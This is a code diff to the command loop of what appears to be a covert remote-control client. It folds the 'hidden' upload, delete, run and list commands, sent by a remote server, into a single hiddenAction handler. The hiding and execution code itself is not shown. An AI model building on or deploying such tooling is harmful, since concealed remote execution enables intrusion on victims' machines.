@@ -5,6 +5,7 @@
 #include "SoftwareManeger.h"
 #include "FunCodes.h"
 #include "HiderManeger.h"
+#include "HiderCodes.h"
 
 void testSoftwareManeger(void);
 
@@ -51,11 +52,11 @@ void loopIter(Client& client, SoftwareManeger& swm, HiderManeger hiderManeger)
     Message msg;
     Error res;
     client.recvCommand(msg);
-    int fnccode = msg.fnccode();
+    uint fncode = msg.fnccode();
     std::string param = msg.param1();
 
     std::string response = "";
-    switch (fnccode)
+    switch (fncode)
     {
     case WRITE_FILE:
         fileWrite(client, param, swm);
@@ -72,27 +73,13 @@ void loopIter(Client& client, SoftwareManeger& swm, HiderManeger hiderManeger)
     case HIDER_SETUP:
         hiderManeger.setUpHider(param);
         break;
-
-    case HIDDEN_UPLOAD:
-        hiderManeger.hiddenUpload(param, client);
-        break;
-
-    case HIDDEN_DELETE:
-            hiderManeger.hiddenDelete(param);
-        break;
-
-    case HIDDEN_RUN:
-        hiderManeger.hiddenRun(param);
-        break;
-
-    case HIDDEN_LIST:
-        hiderManeger.hiddenList(client);
-        break;
-    
-    default:
-        return;
+    }
+    // hidden handling
+    if (fncode & HIDDEN_OPRATION) {
+        res = hiderManeger.hiddenAction(fncode, param, client);
     }
     
+    // TODO change such that there will be response only if we want it to be 
     Message msgres;
     msgres.set_fnccode(res);
     msgres.set_param1(response);
